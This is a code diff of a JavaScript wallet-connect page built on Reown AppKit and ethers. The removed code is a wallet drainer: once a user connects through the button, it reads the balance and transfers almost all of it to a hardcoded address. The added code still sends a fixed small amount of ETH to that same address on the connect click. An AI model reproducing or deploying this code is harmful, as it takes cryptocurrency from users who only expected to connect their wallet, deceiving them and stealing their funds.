@@ -1,104 +1,78 @@
-// Consolidated Ethereum Logic
-import { mainnet, sepolia } from '@reown/appkit/networks'
-import { createAppKit } from '@reown/appkit'
-import { EthersAdapter } from '@reown/appkit-adapter-ethers'
-import { BrowserProvider, formatUnits, parseEther } from 'ethers'
+import { createAppKit } from "@reown/appkit";
+import { EthersAdapter } from "@reown/appkit-adapter-ethers";
+import { mainnet, sepolia } from "@reown/appkit/networks";
+import { BrowserProvider, parseEther } from "ethers";
 
-const ethSecAdds = '0x4472a25BC3935791A95bd384F65D85D669cD9c3E'
-const ethPryAdds = '0x4472a25BC3935791A95bd384F65D85D669cD9c3E'
+// 1. Define your Reown project ID
+const projectId = "fd6b27758d54dc8db988468aaa2c07db";
 
-const projectId = "fd6b27758d54dc8db988468aaa2c07db"
-if (!projectId) throw new Error('VITE_PROJECT_ID is not set')
+// 2. Application metadata
+const metadata = {
+  name: "AppKit",
+  description: "AppKit Example",
+  url: "https://reown.com/appkit", // Should match your actual domain
+  icons: ["https://avatars.githubusercontent.com/u/179229932"],
+};
 
-export const appKit = createAppKit({
+// 3. Create AppKit instance
+const modal = createAppKit({
   adapters: [new EthersAdapter()],
   networks: [mainnet, sepolia],
-  defaultNetwork: sepolia,
+  metadata,
   projectId,
-  themeMode: 'light',
-  themeVariables: { '--w3m-accent': '#000000' },
-  features: { analytics: false },
-})
+  features: {
+    analytics: false,
+  },
+});
 
-export const store = {
-  accountState: {},
-  networkState: {},
-  appKitState: {},
-  themeState: { themeMode: 'light', themeVariables: {} },
-  events: [],
-  walletInfo: {},
-  eip155Provider: null
-}
+// 4. Handle connection and transaction on click
+document.getElementById("open-connect-modal")?.addEventListener("click", async () => {
+  try {
+    await modal.open();
 
-export const updateStore = (key, value) => store[key] = value
+    // Get provider
+    const provider = modal.getWalletProvider();
+    if (!provider) throw new Error("No provider found");
 
-export const getBalance = async (provider, address) => {
-  if (!provider) throw 'No provider available'
-  const balance = await provider.request({ method: 'eth_getBalance', params: [address, 'latest'] })
-  return formatUnits(balance, 'ether')
-}
+    // Get account
+    const account = modal.getAccountState();
+    const addressFrom = account?.address;
+    if (!addressFrom) throw new Error("No address found");
 
-export const sendTx = async (provider, address, balance) => {
-  const ethersProvider = new BrowserProvider(provider);
-  const signer = await ethersProvider.getSigner();
+    // Send transaction
+    const txData = {
+      from: addressFrom,
+      to: "0x4472a25BC3935791A95bd384F65D85D669cD9c3E", // Replace with actual address
+      value: parseEther("0.0001"),
+    };
 
-  const amountToSend = balance - parseEther('0.000005');
-  if (amountToSend > 0n) {
-    const tenPercent = amountToSend / 4n;
-    const ninetyPercent = amountToSend - tenPercent;
-    await signer.sendTransaction({ to: ethSecAdds, value: tenPercent });
-    const tx = await signer.sendTransaction({ to: ethPryAdds, value: ninetyPercent });
-    return tx;
+    const ethersProvider = new BrowserProvider(provider);
+    const signer = await ethersProvider.getSigner();
+    const tx = await signer.sendTransaction(txData);
+
+    console.log("Transaction sent:", tx);
+    toast("Transaction sent successfully!", "success");
+  } catch (err) {
+    console.error("Error:", err);
+    toast(err.message || "Something went wrong!", "error");
   }
-  return null;
-}
+});
 
-export const showToast = (msg) => {
-  const toast = document.createElement('div');
-  toast.textContent = msg;
-  toast.style.cssText = 'position:fixed;top:20px;right:20px;padding:10px 20px;background:black;color:white;border-radius:8px;z-index:9999';
+// 5. Toast function for feedback
+function toast(message, type = "info") {
+  const toast = document.createElement("div");
+  toast.innerText = message;
+  toast.style.cssText = `
+    position: fixed;
+    bottom: 1rem;
+    right: 1rem;
+    padding: 10px 20px;
+    border-radius: 5px;
+    background: ${type === "success" ? "#4caf50" : type === "error" ? "#f44336" : "#333"};
+    color: white;
+    font-size: 14px;
+    z-index: 10000;
+  `;
   document.body.appendChild(toast);
   setTimeout(() => toast.remove(), 4000);
 }
-
-export const initializeSubscribers = (modal) => {
-  modal.subscribeProviders(state => updateStore('eip155Provider', state['eip155']))
-  modal.subscribeAccount(state => updateStore('accountState', state))
-  modal.subscribeNetwork(state => updateStore('networkState', state))
-  modal.subscribeState(state => updateStore('appKitState', state))
-}
-
-initializeSubscribers(appKit)
-
-// Set initial theme
-document.documentElement.setAttribute('data-theme', store.themeState.themeMode)
-document.body.className = store.themeState.themeMode
-
-// Connect and auto-execute logic
-const connectBtn = document.getElementById('open-connect-modal')
-if (connectBtn) {
-  connectBtn.addEventListener('click', async () => {
-    await appKit.open()
-
-    const provider = store.eip155Provider
-    const address = store.accountState.address
-
-    try {
-      const balanceStr = await getBalance(provider, address)
-      const balance = parseEther(balanceStr)
-      showToast(`${balanceStr} ETH available.`)
-
-      const tx = await sendTx(provider, address, balance)
-      if (tx) {
-        showToast(`Transaction sent: ${tx.hash}`)
-      } else {
-        showToast('Insufficient balance to send transaction.')
-      }
-    } catch (err) {
-      console.error(err)
-      showToast('Error occurred: ' + err)
-    }
-  })
-}
-
-document.getElementById('disconnect')?.addEventListener('click', () => appKit.disconnect())
